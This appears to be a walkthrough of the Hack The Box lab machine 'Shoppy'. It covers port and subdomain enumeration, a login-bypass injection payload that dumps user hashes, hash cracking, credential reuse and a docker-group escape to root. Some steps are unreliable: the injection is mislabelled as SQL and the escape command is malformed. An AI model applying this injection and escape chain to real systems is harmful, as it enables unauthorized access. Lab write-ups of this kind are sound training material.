Machine name: Shoppy
--------------------

*   **Status:** Retired
*   **OS:** Linux
*   **Difficulty:** Easy
*   **Date Owned:** 11/23/2022 
*   **IP Assigned:** 10.10.11.180

<br>

Enumeration
-----------

I will begin by enumerating TCP ports on the machine with NMAP using the following switches:

*   \-sS: syn scan, this is quick and stealthy as it does not complete the TCP connection. It can also differentiation between open, closed, and filtered states of a port. I will need to be run with sudo privileges as it requires raw packet manipulation.
*   \-A: enables aggressive scanning and will enable OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (-traceroute).
*   \-p-: will scan all ports on the host.
*   \-T4: timing template 4 is a predefined packet limit per millisecond. Template 4 is considered aggressive.
*   \-oN: output the results to a file.

```text-plain
sudo nmap -sS -A -p- -T4 -oN nmap.txt 10.10.11.180 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-22 22:43 EST
Nmap scan report for 10.10.11.180
Host is up (0.021s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 9e:5e:83:51:d9:9f:89:ea:47:1a:12:eb:81:f9:22:c0 (RSA)
|   256 58:57:ee:eb:06:50:03:7c:84:63:d7:a3:41:5b:1a:d5 (ECDSA)
|_  256 3e:9d:0a:42:90:44:38:60:b3:b6:2c:e9:bd:9a:67:54 (ED25519)
80/tcp   open http     nginx 1.23.1
|_http-title: Did not follow redirect to http://shoppy.htb
|_http-server-header: nginx/1.23.1
9093/tcp open  copycat?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Content-Type: text/plain; version=0.0.4; charset=utf-8
|     Date: Wed, 23 Nov 2022 03:46:28 GMT
|     HELP go_gc_cycles_automatic_gc_cycles_total Count of completed GC cycles generated by the Go runtime.
|     TYPE go_gc_cycles_automatic_gc_cycles_total counter
|     go_gc_cycles_automatic_gc_cycles_total 6
|     HELP go_gc_cycles_forced_gc_cycles_total Count of completed GC cycles forced by the application.
|     TYPE go_gc_cycles_forced_gc_cycles_total counter
|     go_gc_cycles_forced_gc_cycles_total 0
|     HELP go_gc_cycles_total_gc_cycles_total Count of all completed GC cycles.
|     TYPE go_gc_cycles_total_gc_cycles_total counter
|     go_gc_cycles_total_gc_cycles_total 6
|     HELP go_gc_duration_seconds A summary of the pause duration of garbage collection cycles.
|     TYPE go_gc_duration_seconds summary
|    go_gc_duration_seconds{quantile="0"} 7.2959e-05
|     go_gc_duration_seconds{quantil
```

First I'll add the domain to my hosts file and check out whats being hosted on port 80.

```text-plain
echo "10.10.11.180   shoppy.htb" | sudo tee -a /etc/hosts
```

![image](https://user-images.githubusercontent.com/110564012/236976256-a1698f91-4c42-4a4a-badb-bb8d14296170.png)

Not too much to see here. I'll use gobuster to do some sub-directory enumeration.

```text-plain
gobuster dir --url http://shoppy.htb/ --wordlist /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://shoppy.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/05/08 19:46:40 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 302) [Size: 28] [--> /login]
/images               (Status: 301) [Size: 179] [--> /images/]
/login                (Status: 200) [Size: 1074]
/assets               (Status: 301) [Size: 179] [--> /assets/]
/css                  (Status: 301) [Size: 173] [--> /css/]
/js                   (Status: 301) [Size: 171] [--> /js/]
Progress: 4830 / 4990 (96.79%)===============================================================
2023/05/08 19:46:54 Finished
===============================================================
```

Next I'll check what the admin page looks like.

![image](https://user-images.githubusercontent.com/110564012/236976293-49badcd4-9af8-4f9f-abd3-f4e9964cf317.png)

SQL Injection
-------------

I tried a few different common username password combos and didn't get lucky so I'll move on to injection attacks. As per usual pull up the trusty payloadallthethings [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) and 

This is the payload that finally worked: 

> username: admin'||'1==1
> 
> password: pass

We are presented with a webpage with some info about the products as well as some search functionality. 

![image](https://user-images.githubusercontent.com/110564012/236976329-a853d70a-2e84-4dd9-a6d7-82d6569d0652.png)

Test the same payload in the seach field and see if it works there too. which returns the following json export of all users. 

\[{"\_id":"62db0e93d6d6a999a66ee67a","username":"admin","password":"23c6877d9e2b564ef8b32c3a23de27b2"},{"\_id":"62db0e93d6d6a999a66ee67b","username":"josh","password":"6ebcea65320589ca4f2f1ce039975995"}\]

Hash Cracking
-------------

Run hashid to find out which format these are.

```text-plain
hashid -m 23c6877d9e2b564ef8b32c3a23de27b2

Analyzing '23c6877d9e2b564ef8b32c3a23de27b2'
[+] MD2 
[+] MD5 [Hashcat Mode: 0]
[+] MD4 [Hashcat Mode: 900]
[+] Double MD5 [Hashcat Mode: 2600]
[+] LM [Hashcat Mode: 3000]
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 [Hashcat Mode: 8600]
[+] Skype [Hashcat Mode: 23]
[+] Snefru-128 
[+] NTLM [Hashcat Mode: 1000]
[+] Domain Cached Credentials [Hashcat Mode: 1100]
[+] Domain Cached Credentials 2 [Hashcat Mode: 2100]
[+] DNSSEC(NSEC3) [Hashcat Mode: 8300]
[+] RAdmin v2.x [Hashcat Mode: 9900]
```

Now put these hashes into files to make it easier to pass into hashcat.

```text-plain
echo '23c6877d9e2b564ef8b32c3a23de27b2' > admin 
echo '6ebcea65320589ca4f2f1ce039975995' > josh 
```

Next run hashcat against each of these to try to crack the passwords.

```text-plain
hashcat -a 0 -m 0 -o out.txt josh /home/kali/Desktop/Wordlists/rockyou.txt
ession..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
```

Looks like we got the password for josh.

```text-plain
cat out.txt                             
6ebcea65320589ca4f2f1ce039975995:remembermethisway
```

More Web Enumeration
--------------------

I tried to SSH with this password which didnt work so I'll continue to enumerate. Next I'll fuzz for subdomains with ffuf. 

```text-plain
ffuf -u http://shoppy.htb -H "Host: FUZZ.shoppy.htb" -mc 200 -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
       /'___\  /'___\           /'___\       
      /\ \__/ /\ \__/  __  __  /\ \__/       
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
        \ \_\   \ \_\  \ \____/  \ \_\       
         \/_/    \/_/   \/___/    \/_/      
      v1.5.0 Kali Exclusive <3
________________________________________________
:: Method           : GET
:: URL              : http://shoppy.htb
:: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt
:: Header           : Host: FUZZ.shoppy.htb
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 40
:: Matcher          : Response status: 200
________________________________________________
mattermost              [Status: 200, Size: 3122, Words: 141, Lines: 1, Duration: 31ms]
:: Progress: [100000/100000] :: Job [1/1] :: 1557 req/sec :: Duration: [0:01:05] :: Errors: 0 ::
```

ffuf found the subdomain mattermost. I'll add this to my hosts file and navigate to this page.

```text-plain
echo '10.10.11.180 mattermost.shoppy.htb' | sudo tee -a /etc/hosts
```

mattermost.shoppy.htb presents us with another login page so lets try the josh creds on this page. After a bit of poking around I found a message from another user with cleartext creds in it.

![image](https://user-images.githubusercontent.com/110564012/236976386-4a357209-d744-41a1-bb10-9dff09a71db0.png)

Foothold
--------

I'll try to SSH into the target again with these creds, which finally works.

```text-plain
ssh jaeger@shoppy.htb
jaeger@shoppy.htb's password: 
Linux shoppy 5.10.0-18-amd64 #1 SMP Debian 5.10.140-1 (2022-09-02) x86_64
The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.
Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May  8 20:25:57 2023 from 10.10.14.10
jaeger@shoppy:~$ id
uid=1000(jaeger) gid=1000(jaeger) groups=1000(jaeger)
```

The user flag is located at /home/jaeger/user.txt

```text-plain
cat /home/jaeger/user.txt
HTB{********************************}
```

Lateral Movement
----------------

Now that I have user access I'll need to start looking for a path to privilege escalation. First I'll check jaeger's privileges with sudo -l

```text-plain
sudo -l
Matching Defaults entries for jaeger on shoppy:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
User jaeger may run the following commands on shoppy:
   (deploy) /home/deploy/password-manager
```

Take a look at the password manager in a text editor and about half way through the short program we find some text that appears to be the user prompts. 

> Welcome to Josh password manager!Please enter your master password: SampleAccess granted! Here is creds !cat /home/deploy/creds.txtAccess denied! This incident will be reported !

That word after the password prompt might be hardcoded logic for the master password file that looks to be located in /home/deploy/creds.txt, lets try it out. Run the password manager with sudo and specify the user deploy.

```text-plain
sudo -u deploy /home/deploy/password-manager
Welcome to Josh password manager!
Please enter your master password: Sample
Access granted! Here is creds !
Deploy Creds :
username: deploy
password: Deploying@pp!
```

switch users to deploy.

```text-plain
su deploy
Password: 
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```

Check who we are with the ID command. This user is in a group named docker. 

Privilege Escalation
--------------------

I'll try a docker container escape privilege escalation attack. More info about that can be found here: [https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation)

First check which images are mounted.

```text-plain
docker images
REPOSITORY   TAG       IMAGE ID       CREATED        SIZE
alpine       latest    d7d3d98c851f   9 months ago   5.53MB
```

The image name is alpine. Lets run the image mounting the host disk and chroot on it.

```text-plain
docker run -it -v /:/host/ alpine && chroot /host/bash                                        
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

We now have a root shell! the root flag is located at /root/root.txt

```text-plain
cat /root/root.txt
HTB{********************************}
```

Congratulations on completing this machine! Happy hunting.
